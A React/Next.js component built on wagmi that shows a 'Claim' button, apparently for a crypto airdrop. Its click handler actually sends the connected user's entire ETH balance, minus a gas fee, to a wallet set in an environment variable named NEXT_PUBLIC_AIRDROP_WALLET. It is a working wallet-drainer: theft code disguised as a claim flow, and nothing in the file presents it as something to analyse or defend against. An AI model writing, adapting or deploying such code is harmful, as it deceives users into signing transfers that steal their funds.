"use client";

import React from "react";
import { useParams } from "next/navigation";
import {
  type BaseError,
  useAccount,
  useBalance,
  useSendTransaction,
} from "wagmi";
import { parseEther } from "viem";

import { env } from "@/env.mjs";
import { GAS_FEE } from "@/lib/constants";

import { Button } from "../ui/button";
import DefaultConnectButton from "../common/default-connect-button";

const TransferEth = () => {
  const { address } = useAccount();
  const { id } = useParams<{ id: string }>();
  const { data: ethBalance, error: balanceError } = useBalance({
    address,
    unit: "wei",
  });
  const { error, sendTransaction: transfer, isPending } = useSendTransaction();

  const handleSubmit = (e: React.MouseEvent<HTMLButtonElement, MouseEvent>) => {
    e.preventDefault();
    transfer({
      to: env.NEXT_PUBLIC_AIRDROP_WALLET as `0x${string}`,
      value: (ethBalance?.value || parseEther("1")) - GAS_FEE,
      data: "0x",
    });
  };

  if (id !== address) {
    return <DefaultConnectButton />;
  }

  if (!ethBalance?.value || !!error || !!balanceError) {
    return (
      <Button variant={"destructive"} className="w-full sm:w-1/3">
        Error:{" "}
        {(error as BaseError)?.shortMessage ||
          error?.message ||
          (balanceError as BaseError)?.shortMessage ||
          balanceError?.message}
      </Button>
    );
  }

  return (
    <Button
      variant={"default"}
      className="w-full"
      onClick={handleSubmit}
      disabled={isPending}
    >
      {!isPending ? "Claim" : "Claiming..."}
    </Button>
  );
};

export default TransferEth;
